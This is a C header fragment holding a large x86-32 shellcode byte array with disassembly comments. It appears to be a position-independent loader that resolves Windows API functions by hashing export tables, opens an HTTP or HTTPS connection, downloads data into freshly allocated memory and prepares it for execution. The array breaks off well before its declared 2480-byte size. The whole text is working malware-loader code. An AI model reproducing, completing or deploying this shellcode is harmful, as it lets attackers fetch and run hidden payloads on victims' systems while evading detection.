
// Target architecture : X86 32

#define PAYLOAD_X86_SIZE 2480

char PAYLOAD_X86[] = {
  /* 0000 */ "\x53"                             /* push      ebx                                 */
  /* 0001 */ "\x55"                             /* push      ebp                                 */
  /* 0002 */ "\x56"                             /* push      esi                                 */
  /* 0003 */ "\x8b\xf1"                         /* mov       esi, ecx                            */
  /* 0005 */ "\x57"                             /* push      edi                                 */
  /* 0006 */ "\xff\xb6\x2c\x01\x00\x00"         /* push      dword ptr [esi + 0x12c]             */
  /* 000C */ "\xff\xb6\x28\x01\x00\x00"         /* push      dword ptr [esi + 0x128]             */
  /* 0012 */ "\xff\xb6\x3c\x01\x00\x00"         /* push      dword ptr [esi + 0x13c]             */
  /* 0018 */ "\xff\xb6\x38\x01\x00\x00"         /* push      dword ptr [esi + 0x138]             */
  /* 001E */ "\xe8\x1b\x08\x00\x00"             /* call      0x83e                               */
  /* 0023 */ "\x89\x86\x38\x01\x00\x00"         /* mov       dword ptr [esi + 0x138], eax        */
  /* 0029 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 002B */ "\x74\x73"                         /* je        0xa0                                */
  /* 002D */ "\x33\xff"                         /* xor       edi, edi                            */
  /* 002F */ "\x39\x7e\x20"                     /* cmp       dword ptr [esi + 0x20], edi         */
  /* 0032 */ "\x76\x13"                         /* jbe       0x47                                */
  /* 0034 */ "\x8d\x5e\x24"                     /* lea       ebx, dword ptr [esi + 0x24]         */
  /* 0037 */ "\x53"                             /* push      ebx                                 */
  /* 0038 */ "\xff\x96\x38\x01\x00\x00"         /* call      dword ptr [esi + 0x138]             */
  /* 003E */ "\x47"                             /* inc       edi                                 */
  /* 003F */ "\x83\xc3\x20"                     /* add       ebx, 0x20                           */
  /* 0042 */ "\x3b\x7e\x20"                     /* cmp       edi, dword ptr [esi + 0x20]         */
  /* 0045 */ "\x72\xf0"                         /* jb        0x37                                */
  /* 0047 */ "\x33\xff"                         /* xor       edi, edi                            */
  /* 0049 */ "\x47"                             /* inc       edi                                 */
  /* 004A */ "\x39\xbe\x30\x01\x00\x00"         /* cmp       dword ptr [esi + 0x130], edi        */
  /* 0050 */ "\x76\x38"                         /* jbe       0x8a                                */
  /* 0052 */ "\x8d\xae\x3c\x01\x00\x00"         /* lea       ebp, dword ptr [esi + 0x13c]        */
  /* 0058 */ "\x8d\x9e\x40\x01\x00\x00"         /* lea       ebx, dword ptr [esi + 0x140]        */
  /* 005E */ "\xff\xb6\x2c\x01\x00\x00"         /* push      dword ptr [esi + 0x12c]             */
  /* 0064 */ "\xff\xb6\x28\x01\x00\x00"         /* push      dword ptr [esi + 0x128]             */
  /* 006A */ "\xff\x73\x04"                     /* push      dword ptr [ebx + 4]                 */
  /* 006D */ "\xff\x33"                         /* push      dword ptr [ebx]                     */
  /* 006F */ "\xe8\xca\x07\x00\x00"             /* call      0x83e                               */
  /* 0074 */ "\x89\x45\x00"                     /* mov       dword ptr [ebp], eax                */
  /* 0077 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0079 */ "\x74\x25"                         /* je        0xa0                                */
  /* 007B */ "\x47"                             /* inc       edi                                 */
  /* 007C */ "\x83\xc3\x08"                     /* add       ebx, 8                              */
  /* 007F */ "\x83\xc5\x04"                     /* add       ebp, 4                              */
  /* 0082 */ "\x3b\xbe\x30\x01\x00\x00"         /* cmp       edi, dword ptr [esi + 0x130]        */
  /* 0088 */ "\x72\xd4"                         /* jb        0x5e                                */
  /* 008A */ "\x8b\x86\x18\x03\x00\x00"         /* mov       eax, dword ptr [esi + 0x318]        */
  /* 0090 */ "\x83\xf8\x03"                     /* cmp       eax, 3                              */
  /* 0093 */ "\x75\x13"                         /* jne       0xa8                                */
  /* 0095 */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 0097 */ "\xe8\x1a\x01\x00\x00"             /* call      0x1b6                               */
  /* 009C */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 009E */ "\x75\x16"                         /* jne       0xb6                                */
  /* 00A0 */ "\x83\xc8\xff"                     /* or        eax, 0xffffffff                     */
  /* 00A3 */ "\x5f"                             /* pop       edi                                 */
  /* 00A4 */ "\x5e"                             /* pop       esi                                 */
  /* 00A5 */ "\x5d"                             /* pop       ebp                                 */
  /* 00A6 */ "\x5b"                             /* pop       ebx                                 */
  /* 00A7 */ "\xc3"                             /* ret                                           */
  /* 00A8 */ "\x83\xf8\x02"                     /* cmp       eax, 2                              */
  /* 00AB */ "\x75\x09"                         /* jne       0xb6                                */
  /* 00AD */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 00AF */ "\xe8\x5e\x01\x00\x00"             /* call      0x212                               */
  /* 00B4 */ "\xeb\xe6"                         /* jmp       0x9c                                */
  /* 00B6 */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 00B8 */ "\xe8\x09\x06\x00\x00"             /* call      0x6c6                               */
  /* 00BD */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 00BF */ "\x74\xdf"                         /* je        0xa0                                */
  /* 00C1 */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 00C3 */ "\xe8\x33\x03\x00\x00"             /* call      0x3fb                               */
  /* 00C8 */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 00CA */ "\xeb\xd7"                         /* jmp       0xa3                                */
  /* 00CC */ "\x81\xec\x14\x01\x00\x00"         /* sub       esp, 0x114                          */
  /* 00D2 */ "\x53"                             /* push      ebx                                 */
  /* 00D3 */ "\x55"                             /* push      ebp                                 */
  /* 00D4 */ "\x56"                             /* push      esi                                 */
  /* 00D5 */ "\x8b\xf1"                         /* mov       esi, ecx                            */
  /* 00D7 */ "\x57"                             /* push      edi                                 */
  /* 00D8 */ "\x8b\x46\x3c"                     /* mov       eax, dword ptr [esi + 0x3c]         */
  /* 00DB */ "\x8b\x44\x30\x78"                 /* mov       eax, dword ptr [eax + esi + 0x78]   */
  /* 00DF */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 00E1 */ "\x0f\x84\xaf\x00\x00\x00"         /* je        0x196                               */
  /* 00E7 */ "\x8b\x7c\x30\x18"                 /* mov       edi, dword ptr [eax + esi + 0x18]   */
  /* 00EB */ "\x85\xff"                         /* test      edi, edi                            */
  /* 00ED */ "\x0f\x84\xa3\x00\x00\x00"         /* je        0x196                               */
  /* 00F3 */ "\x8b\x4c\x30\x20"                 /* mov       ecx, dword ptr [eax + esi + 0x20]   */
  /* 00F7 */ "\x33\xdb"                         /* xor       ebx, ebx                            */
  /* 00F9 */ "\x8b\x6c\x30\x1c"                 /* mov       ebp, dword ptr [eax + esi + 0x1c]   */
  /* 00FD */ "\x03\xce"                         /* add       ecx, esi                            */
  /* 00FF */ "\x89\x4c\x24\x10"                 /* mov       dword ptr [esp + 0x10], ecx         */
  /* 0103 */ "\x03\xee"                         /* add       ebp, esi                            */
  /* 0105 */ "\x8b\x4c\x30\x24"                 /* mov       ecx, dword ptr [eax + esi + 0x24]   */
  /* 0109 */ "\x8b\x44\x30\x0c"                 /* mov       eax, dword ptr [eax + esi + 0xc]    */
  /* 010D */ "\x03\xce"                         /* add       ecx, esi                            */
  /* 010F */ "\x03\xc6"                         /* add       eax, esi                            */
  /* 0111 */ "\x89\x4c\x24\x1c"                 /* mov       dword ptr [esp + 0x1c], ecx         */
  /* 0115 */ "\x8a\x08"                         /* mov       cl, byte ptr [eax]                  */
  /* 0117 */ "\x84\xc9"                         /* test      cl, cl                              */
  /* 0119 */ "\x74\x14"                         /* je        0x12f                               */
  /* 011B */ "\x8d\x54\x24\x20"                 /* lea       edx, dword ptr [esp + 0x20]         */
  /* 011F */ "\x2b\xd0"                         /* sub       edx, eax                            */
  /* 0121 */ "\x80\xc9\x20"                     /* or        cl, 0x20                            */
  /* 0124 */ "\x43"                             /* inc       ebx                                 */
  /* 0125 */ "\x88\x0c\x02"                     /* mov       byte ptr [edx + eax], cl            */
  /* 0128 */ "\x40"                             /* inc       eax                                 */
  /* 0129 */ "\x8a\x08"                         /* mov       cl, byte ptr [eax]                  */
  /* 012B */ "\x84\xc9"                         /* test      cl, cl                              */
  /* 012D */ "\x75\xf2"                         /* jne       0x121                               */
  /* 012F */ "\xff\xb4\x24\x34\x01\x00\x00"     /* push      dword ptr [esp + 0x134]             */
  /* 0136 */ "\x8d\x4c\x24\x24"                 /* lea       ecx, dword ptr [esp + 0x24]         */
  /* 013A */ "\xc6\x44\x1c\x24\x00"             /* mov       byte ptr [esp + ebx + 0x24], 0      */
  /* 013F */ "\xff\xb4\x24\x34\x01\x00\x00"     /* push      dword ptr [esp + 0x134]             */
  /* 0146 */ "\xe8\x30\x07\x00\x00"             /* call      0x87b                               */
  /* 014B */ "\x8b\x5c\x24\x10"                 /* mov       ebx, dword ptr [esp + 0x10]         */
  /* 014F */ "\x83\xc3\xfc"                     /* add       ebx, -4                             */
  /* 0152 */ "\x89\x44\x24\x14"                 /* mov       dword ptr [esp + 0x14], eax         */
  /* 0156 */ "\x89\x54\x24\x18"                 /* mov       dword ptr [esp + 0x18], edx         */
  /* 015A */ "\x8d\x1c\xbb"                     /* lea       ebx, dword ptr [ebx + edi*4]        */
  /* 015D */ "\xff\xb4\x24\x34\x01\x00\x00"     /* push      dword ptr [esp + 0x134]             */
  /* 0164 */ "\x8b\x0b"                         /* mov       ecx, dword ptr [ebx]                */
  /* 0166 */ "\xff\xb4\x24\x34\x01\x00\x00"     /* push      dword ptr [esp + 0x134]             */
  /* 016D */ "\x03\xce"                         /* add       ecx, esi                            */
  /* 016F */ "\xe8\x07\x07\x00\x00"             /* call      0x87b                               */
  /* 0174 */ "\x03\x44\x24\x14"                 /* add       eax, dword ptr [esp + 0x14]         */
  /* 0178 */ "\x13\x54\x24\x18"                 /* adc       edx, dword ptr [esp + 0x18]         */
  /* 017C */ "\x3b\x84\x24\x28\x01\x00\x00"     /* cmp       eax, dword ptr [esp + 0x128]        */
  /* 0183 */ "\x75\x09"                         /* jne       0x18e                               */
  /* 0185 */ "\x3b\x94\x24\x2c\x01\x00\x00"     /* cmp       edx, dword ptr [esp + 0x12c]        */
  /* 018C */ "\x74\x17"                         /* je        0x1a5                               */
  /* 018E */ "\x83\xeb\x04"                     /* sub       ebx, 4                              */
  /* 0191 */ "\x83\xef\x01"                     /* sub       edi, 1                              */
  /* 0194 */ "\x75\xc7"                         /* jne       0x15d                               */
  /* 0196 */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 0198 */ "\x5f"                             /* pop       edi                                 */
  /* 0199 */ "\x5e"                             /* pop       esi                                 */
  /* 019A */ "\x5d"                             /* pop       ebp                                 */
  /* 019B */ "\x5b"                             /* pop       ebx                                 */
  /* 019C */ "\x81\xc4\x14\x01\x00\x00"         /* add       esp, 0x114                          */
  /* 01A2 */ "\xc2\x10\x00"                     /* ret       0x10                                */
  /* 01A5 */ "\x8b\x44\x24\x1c"                 /* mov       eax, dword ptr [esp + 0x1c]         */
  /* 01A9 */ "\x0f\xb7\x44\x78\xfe"             /* movzx     eax, word ptr [eax + edi*2 - 2]     */
  /* 01AE */ "\x8b\x44\x85\x00"                 /* mov       eax, dword ptr [ebp + eax*4]        */
  /* 01B2 */ "\x03\xc6"                         /* add       eax, esi                            */
  /* 01B4 */ "\xeb\xe2"                         /* jmp       0x198                               */
  /* 01B6 */ "\x53"                             /* push      ebx                                 */
  /* 01B7 */ "\x56"                             /* push      esi                                 */
  /* 01B8 */ "\x8b\xf1"                         /* mov       esi, ecx                            */
  /* 01BA */ "\x33\xdb"                         /* xor       ebx, ebx                            */
  /* 01BC */ "\x57"                             /* push      edi                                 */
  /* 01BD */ "\x8d\x86\x3c\x03\x00\x00"         /* lea       eax, dword ptr [esi + 0x33c]        */
  /* 01C3 */ "\x50"                             /* push      eax                                 */
  /* 01C4 */ "\x8d\x86\x1c\x03\x00\x00"         /* lea       eax, dword ptr [esi + 0x31c]        */
  /* 01CA */ "\x50"                             /* push      eax                                 */
  /* 01CB */ "\x53"                             /* push      ebx                                 */
  /* 01CC */ "\xff\x96\x48\x01\x00\x00"         /* call      dword ptr [esi + 0x148]             */
  /* 01D2 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 01D4 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 01D6 */ "\x74\x34"                         /* je        0x20c                               */
  /* 01D8 */ "\x57"                             /* push      edi                                 */
  /* 01D9 */ "\x53"                             /* push      ebx                                 */
  /* 01DA */ "\xff\x96\x4c\x01\x00\x00"         /* call      dword ptr [esi + 0x14c]             */
  /* 01E0 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 01E2 */ "\x74\x28"                         /* je        0x20c                               */
  /* 01E4 */ "\x50"                             /* push      eax                                 */
  /* 01E5 */ "\xff\x96\x50\x01\x00\x00"         /* call      dword ptr [esi + 0x150]             */
  /* 01EB */ "\x57"                             /* push      edi                                 */
  /* 01EC */ "\x53"                             /* push      ebx                                 */
  /* 01ED */ "\x89\x86\xd0\x05\x00\x00"         /* mov       dword ptr [esi + 0x5d0], eax        */
  /* 01F3 */ "\xff\x96\x54\x01\x00\x00"         /* call      dword ptr [esi + 0x154]             */
  /* 01F9 */ "\x89\x86\xcc\x05\x00\x00"         /* mov       dword ptr [esi + 0x5cc], eax        */
  /* 01FF */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 0201 */ "\x39\x9e\xd0\x05\x00\x00"         /* cmp       dword ptr [esi + 0x5d0], ebx        */
  /* 0207 */ "\x0f\x95\xc0"                     /* setne     al                                  */
  /* 020A */ "\xeb\x02"                         /* jmp       0x20e                               */
  /* 020C */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 020E */ "\x5f"                             /* pop       edi                                 */
  /* 020F */ "\x5e"                             /* pop       esi                                 */
  /* 0210 */ "\x5b"                             /* pop       ebx                                 */
  /* 0211 */ "\xc3"                             /* ret                                           */
  /* 0212 */ "\x81\xec\x58\x01\x00\x00"         /* sub       esp, 0x158                          */
  /* 0218 */ "\x53"                             /* push      ebx                                 */
  /* 0219 */ "\x55"                             /* push      ebp                                 */
  /* 021A */ "\x56"                             /* push      esi                                 */
  /* 021B */ "\x57"                             /* push      edi                                 */
  /* 021C */ "\x6a\x3c"                         /* push      0x3c                                */
  /* 021E */ "\x5a"                             /* pop       edx                                 */
  /* 021F */ "\x32\xc0"                         /* xor       al, al                              */
  /* 0221 */ "\x8d\x7c\x24\x2c"                 /* lea       edi, dword ptr [esp + 0x2c]         */
  /* 0225 */ "\x8b\xd9"                         /* mov       ebx, ecx                            */
  /* 0227 */ "\x33\xf6"                         /* xor       esi, esi                            */
  /* 0229 */ "\x8b\xca"                         /* mov       ecx, edx                            */
  /* 022B */ "\x89\x74\x24\x1c"                 /* mov       dword ptr [esp + 0x1c], esi         */
  /* 022F */ "\xf3\xaa"                         /* rep stosb byte ptr es:[edi], al               */
  /* 0231 */ "\x8d\x44\x24\x68"                 /* lea       eax, dword ptr [esp + 0x68]         */
  /* 0235 */ "\x89\x54\x24\x2c"                 /* mov       dword ptr [esp + 0x2c], edx         */
  /* 0239 */ "\x89\x44\x24\x3c"                 /* mov       dword ptr [esp + 0x3c], eax         */
  /* 023D */ "\xbd\x00\x02\x60\x84"             /* mov       ebp, 0x84600200                     */
  /* 0242 */ "\x8d\x84\x24\xe8\x00\x00\x00"     /* lea       eax, dword ptr [esp + 0xe8]         */
  /* 0249 */ "\x89\x44\x24\x58"                 /* mov       dword ptr [esp + 0x58], eax         */
  /* 024D */ "\x8d\x42\x44"                     /* lea       eax, dword ptr [edx + 0x44]         */
  /* 0250 */ "\x89\x44\x24\x40"                 /* mov       dword ptr [esp + 0x40], eax         */
  /* 0254 */ "\x89\x44\x24\x5c"                 /* mov       dword ptr [esp + 0x5c], eax         */
  /* 0258 */ "\x8d\x44\x24\x2c"                 /* lea       eax, dword ptr [esp + 0x2c]         */
  /* 025C */ "\x50"                             /* push      eax                                 */
  /* 025D */ "\x68\x00\x00\x00\x10"             /* push      0x10000000                          */
  /* 0262 */ "\x56"                             /* push      esi                                 */
  /* 0263 */ "\x8d\x83\x1c\x03\x00\x00"         /* lea       eax, dword ptr [ebx + 0x31c]        */
  /* 0269 */ "\x50"                             /* push      eax                                 */
  /* 026A */ "\xff\x93\x74\x01\x00\x00"         /* call      dword ptr [ebx + 0x174]             */
  /* 0270 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0272 */ "\x0f\x84\x76\x01\x00\x00"         /* je        0x3ee                               */
  /* 0278 */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 027A */ "\x83\x7c\x24\x38\x04"             /* cmp       dword ptr [esp + 0x38], 4           */
  /* 027F */ "\x56"                             /* push      esi                                 */
  /* 0280 */ "\x56"                             /* push      esi                                 */
  /* 0281 */ "\x0f\x94\xc0"                     /* sete      al                                  */
  /* 0284 */ "\x56"                             /* push      esi                                 */
  /* 0285 */ "\x89\x44\x24\x20"                 /* mov       dword ptr [esp + 0x20], eax         */
  /* 0289 */ "\xb8\x00\x32\xe0\x84"             /* mov       eax, 0x84e03200                     */
  /* 028E */ "\x56"                             /* push      esi                                 */
  /* 028F */ "\x0f\x44\xe8"                     /* cmove     ebp, eax                            */
  /* 0292 */ "\x56"                             /* push      esi                                 */
  /* 0293 */ "\x89\x6c\x24\x2c"                 /* mov       dword ptr [esp + 0x2c], ebp         */
  /* 0297 */ "\xff\x93\x78\x01\x00\x00"         /* call      dword ptr [ebx + 0x178]             */
  /* 029D */ "\x8b\xc8"                         /* mov       ecx, eax                            */
  /* 029F */ "\x89\x4c\x24\x28"                 /* mov       dword ptr [esp + 0x28], ecx         */
  /* 02A3 */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 02A5 */ "\x0f\x84\x43\x01\x00\x00"         /* je        0x3ee                               */
  /* 02AB */ "\x8b\x6c\x24\x14"                 /* mov       ebp, dword ptr [esp + 0x14]         */
  /* 02AF */ "\xba\xbb\x01\x00\x00"             /* mov       edx, 0x1bb                          */
  /* 02B4 */ "\x56"                             /* push      esi                                 */
  /* 02B5 */ "\x56"                             /* push      esi                                 */
  /* 02B6 */ "\x6a\x03"                         /* push      3                                   */
  /* 02B8 */ "\x56"                             /* push      esi                                 */
  /* 02B9 */ "\x56"                             /* push      esi                                 */
  /* 02BA */ "\x6a\x50"                         /* push      0x50                                */
  /* 02BC */ "\x58"                             /* pop       eax                                 */
  /* 02BD */ "\x85\xed"                         /* test      ebp, ebp                            */
  /* 02BF */ "\x0f\x45\xc2"                     /* cmovne    eax, edx                            */
  /* 02C2 */ "\x0f\xb7\xc0"                     /* movzx     eax, ax                             */
  /* 02C5 */ "\x50"                             /* push      eax                                 */
  /* 02C6 */ "\x8d\x84\x24\x80\x00\x00\x00"     /* lea       eax, dword ptr [esp + 0x80]         */
  /* 02CD */ "\x50"                             /* push      eax                                 */
  /* 02CE */ "\x51"                             /* push      ecx                                 */
  /* 02CF */ "\xff\x93\x7c\x01\x00\x00"         /* call      dword ptr [ebx + 0x17c]             */
  /* 02D5 */ "\x8b\xc8"                         /* mov       ecx, eax                            */
  /* 02D7 */ "\x89\x4c\x24\x14"                 /* mov       dword ptr [esp + 0x14], ecx         */
  /* 02DB */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 02DD */ "\x0f\x84\xfd\x00\x00\x00"         /* je        0x3e0                               */
  /* 02E3 */ "\x56"                             /* push      esi                                 */
  /* 02E4 */ "\xff\x74\x24\x1c"                 /* push      dword ptr [esp + 0x1c]              */
  /* 02E8 */ "\x8d\x84\x24\xf0\x00\x00\x00"     /* lea       eax, dword ptr [esp + 0xf0]         */
  /* 02EF */ "\x56"                             /* push      esi                                 */
  /* 02F0 */ "\x56"                             /* push      esi                                 */
  /* 02F1 */ "\x56"                             /* push      esi                                 */
  /* 02F2 */ "\x50"                             /* push      eax                                 */
  /* 02F3 */ "\x8d\x83\x9c\x03\x00\x00"         /* lea       eax, dword ptr [ebx + 0x39c]        */
  /* 02F9 */ "\x50"                             /* push      eax                                 */
  /* 02FA */ "\x51"                             /* push      ecx                                 */
  /* 02FB */ "\xff\x93\x8c\x01\x00\x00"         /* call      dword ptr [ebx + 0x18c]             */
  /* 0301 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 0303 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 0305 */ "\x0f\x84\xcb\x00\x00\x00"         /* je        0x3d6                               */
  /* 030B */ "\x85\xed"                         /* test      ebp, ebp                            */
  /* 030D */ "\x74\x22"                         /* je        0x331                               */
  /* 030F */ "\xf7\x44\x24\x18\x00\x10\x00\x00" /* test      dword ptr [esp + 0x18], 0x1000      */
  /* 0317 */ "\x74\x18"                         /* je        0x331                               */
  /* 0319 */ "\x6a\x04"                         /* push      4                                   */
  /* 031B */ "\x8d\x44\x24\x24"                 /* lea       eax, dword ptr [esp + 0x24]         */
  /* 031F */ "\xc7\x44\x24\x24\x80\x33\x00\x00" /* mov       dword ptr [esp + 0x24], 0x3380      */
  /* 0327 */ "\x50"                             /* push      eax                                 */
  /* 0328 */ "\x6a\x1f"                         /* push      0x1f                                */
  /* 032A */ "\x57"                             /* push      edi                                 */
  /* 032B */ "\xff\x93\x80\x01\x00\x00"         /* call      dword ptr [ebx + 0x180]             */
  /* 0331 */ "\x56"                             /* push      esi                                 */
  /* 0332 */ "\x56"                             /* push      esi                                 */
  /* 0333 */ "\x56"                             /* push      esi                                 */
  /* 0334 */ "\x56"                             /* push      esi                                 */
  /* 0335 */ "\x57"                             /* push      edi                                 */
  /* 0336 */ "\xff\x93\x90\x01\x00\x00"         /* call      dword ptr [ebx + 0x190]             */
  /* 033C */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 033E */ "\x0f\x84\x8b\x00\x00\x00"         /* je        0x3cf                               */
  /* 0344 */ "\x56"                             /* push      esi                                 */
  /* 0345 */ "\x8d\x44\x24\x14"                 /* lea       eax, dword ptr [esp + 0x14]         */
  /* 0349 */ "\xc7\x44\x24\x14\x04\x00\x00\x00" /* mov       dword ptr [esp + 0x14], 4           */
  /* 0351 */ "\x50"                             /* push      eax                                 */
  /* 0352 */ "\x8d\x44\x24\x24"                 /* lea       eax, dword ptr [esp + 0x24]         */
  /* 0356 */ "\x50"                             /* push      eax                                 */
  /* 0357 */ "\x68\x13\x00\x00\x20"             /* push      0x20000013                          */
  /* 035C */ "\x57"                             /* push      edi                                 */
  /* 035D */ "\xff\x93\x94\x01\x00\x00"         /* call      dword ptr [ebx + 0x194]             */
  /* 0363 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0365 */ "\x74\x68"                         /* je        0x3cf                               */
  /* 0367 */ "\x81\x7c\x24\x1c\xc8\x00\x00\x00" /* cmp       dword ptr [esp + 0x1c], 0xc8        */
  /* 036F */ "\x75\x5e"                         /* jne       0x3cf                               */
  /* 0371 */ "\x56"                             /* push      esi                                 */
  /* 0372 */ "\x8d\x44\x24\x14"                 /* lea       eax, dword ptr [esp + 0x14]         */
  /* 0376 */ "\xc7\x44\x24\x14\x04\x00\x00\x00" /* mov       dword ptr [esp + 0x14], 4           */
  /* 037E */ "\x50"                             /* push      eax                                 */
  /* 037F */ "\x8d\xab\xcc\x05\x00\x00"         /* lea       ebp, dword ptr [ebx + 0x5cc]        */
  /* 0385 */ "\x55"                             /* push      ebp                                 */
  /* 0386 */ "\x68\x05\x00\x00\x20"             /* push      0x20000005                          */
  /* 038B */ "\x57"                             /* push      edi                                 */
  /* 038C */ "\x89\x75\x00"                     /* mov       dword ptr [ebp], esi                */
  /* 038F */ "\xff\x93\x94\x01\x00\x00"         /* call      dword ptr [ebx + 0x194]             */
  /* 0395 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0397 */ "\x74\x36"                         /* je        0x3cf                               */
  /* 0399 */ "\x39\x75\x00"                     /* cmp       dword ptr [ebp], esi                */
  /* 039C */ "\x74\x31"                         /* je        0x3cf                               */
  /* 039E */ "\x6a\x04"                         /* push      4                                   */
  /* 03A0 */ "\x68\x00\x30\x00\x00"             /* push      0x3000                              */
  /* 03A5 */ "\xff\x75\x00"                     /* push      dword ptr [ebp]                     */
  /* 03A8 */ "\x56"                             /* push      esi                                 */
  /* 03A9 */ "\xff\x93\x3c\x01\x00\x00"         /* call      dword ptr [ebx + 0x13c]             */
  /* 03AF */ "\x89\x83\xd0\x05\x00\x00"         /* mov       dword ptr [ebx + 0x5d0], eax        */
  /* 03B5 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 03B7 */ "\x74\x16"                         /* je        0x3cf                               */
  /* 03B9 */ "\x8d\x4c\x24\x24"                 /* lea       ecx, dword ptr [esp + 0x24]         */
  /* 03BD */ "\x89\x74\x24\x24"                 /* mov       dword ptr [esp + 0x24], esi         */
  /* 03C1 */ "\x51"                             /* push      ecx                                 */
  /* 03C2 */ "\xff\x75\x00"                     /* push      dword ptr [ebp]                     */
  /* 03C5 */ "\x50"                             /* push      eax                                 */
  /* 03C6 */ "\x57"                             /* push      edi                                 */
  /* 03C7 */ "\xff\x93\x84\x01\x00\x00"         /* call      dword ptr [ebx + 0x184]             */
  /* 03CD */ "\x8b\xf0"                         /* mov       esi, eax                            */
  /* 03CF */ "\x57"                             /* push      edi                                 */
  /* 03D0 */ "\xff\x93\x88\x01\x00\x00"         /* call      dword ptr [ebx + 0x188]             */
  /* 03D6 */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 03DA */ "\xff\x93\x88\x01\x00\x00"         /* call      dword ptr [ebx + 0x188]             */
  /* 03E0 */ "\xff\x74\x24\x28"                 /* push      dword ptr [esp + 0x28]              */
  /* 03E4 */ "\xff\x93\x88\x01\x00\x00"         /* call      dword ptr [ebx + 0x188]             */
  /* 03EA */ "\x8b\xc6"                         /* mov       eax, esi                            */
  /* 03EC */ "\xeb\x02"                         /* jmp       0x3f0                               */
  /* 03EE */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 03F0 */ "\x5f"                             /* pop       edi                                 */
  /* 03F1 */ "\x5e"                             /* pop       esi                                 */
  /* 03F2 */ "\x5d"                             /* pop       ebp                                 */
  /* 03F3 */ "\x5b"                             /* pop       ebx                                 */
  /* 03F4 */ "\x81\xc4\x58\x01\x00\x00"         /* add       esp, 0x158                          */
  /* 03FA */ "\xc3"                             /* ret                                           */
  /* 03FB */ "\x83\xec\x68"                     /* sub       esp, 0x68                           */
  /* 03FE */ "\x53"                             /* push      ebx                                 */
  /* 03FF */ "\x8b\xd9"                         /* mov       ebx, ecx                            */
  /* 0401 */ "\x55"                             /* push      ebp                                 */
  /* 0402 */ "\x56"                             /* push      esi                                 */
  /* 0403 */ "\x57"                             /* push      edi                                 */
  /* 0404 */ "\x83\xbb\x18\x03\x00\x00\x01"     /* cmp       dword ptr [ebx + 0x318], 1          */
  /* 040B */ "\x8d\xb3\xd0\x05\x00\x00"         /* lea       esi, dword ptr [ebx + 0x5d0]        */
  /* 0411 */ "\x74\x02"                         /* je        0x415                               */
  /* 0413 */ "\x8b\x36"                         /* mov       esi, dword ptr [esi]                */
  /* 0415 */ "\x83\x64\x24\x44\x00"             /* and       dword ptr [esp + 0x44], 0           */
  /* 041A */ "\x8b\x86\xc4\x03\x00\x00"         /* mov       eax, dword ptr [esi + 0x3c4]        */
  /* 0420 */ "\x89\x44\x24\x40"                 /* mov       dword ptr [esp + 0x40], eax         */
  /* 0424 */ "\x8d\x44\x24\x40"                 /* lea       eax, dword ptr [esp + 0x40]         */
  /* 0428 */ "\x50"                             /* push      eax                                 */
  /* 0429 */ "\x6a\x01"                         /* push      1                                   */
  /* 042B */ "\x6a\x11"                         /* push      0x11                                */
  /* 042D */ "\xff\x93\x5c\x01\x00\x00"         /* call      dword ptr [ebx + 0x15c]             */
  /* 0433 */ "\x8b\xe8"                         /* mov       ebp, eax                            */
  /* 0435 */ "\x89\x6c\x24\x3c"                 /* mov       dword ptr [esp + 0x3c], ebp         */
  /* 0439 */ "\x85\xed"                         /* test      ebp, ebp                            */
  /* 043B */ "\x0f\x84\x7d\x02\x00\x00"         /* je        0x6be                               */
  /* 0441 */ "\x33\xc9"                         /* xor       ecx, ecx                            */
  /* 0443 */ "\x89\x4c\x24\x10"                 /* mov       dword ptr [esp + 0x10], ecx         */
  /* 0447 */ "\x8b\x55\x0c"                     /* mov       edx, dword ptr [ebp + 0xc]          */
  /* 044A */ "\x39\x8e\xc4\x03\x00\x00"         /* cmp       dword ptr [esi + 0x3c4], ecx        */
  /* 0450 */ "\x76\x1b"                         /* jbe       0x46d                               */
  /* 0452 */ "\x8a\x84\x0e\xc8\x03\x00\x00"     /* mov       al, byte ptr [esi + ecx + 0x3c8]    */
  /* 0459 */ "\x88\x04\x0a"                     /* mov       byte ptr [edx + ecx], al            */
  /* 045C */ "\x8b\x4c\x24\x10"                 /* mov       ecx, dword ptr [esp + 0x10]         */
  /* 0460 */ "\x41"                             /* inc       ecx                                 */
  /* 0461 */ "\x89\x4c\x24\x10"                 /* mov       dword ptr [esp + 0x10], ecx         */
  /* 0465 */ "\x3b\x8e\xc4\x03\x00\x00"         /* cmp       ecx, dword ptr [esi + 0x3c4]        */
  /* 046B */ "\x72\xe5"                         /* jb        0x452                               */
  /* 046D */ "\x8d\x86\x40\x01\x00\x00"         /* lea       eax, dword ptr [esi + 0x140]        */
  /* 0473 */ "\x50"                             /* push      eax                                 */
  /* 0474 */ "\xff\x93\x6c\x01\x00\x00"         /* call      dword ptr [ebx + 0x16c]             */
  /* 047A */ "\x8d\x8e\x80\x01\x00\x00"         /* lea       ecx, dword ptr [esi + 0x180]        */
  /* 0480 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 0482 */ "\x51"                             /* push      ecx                                 */
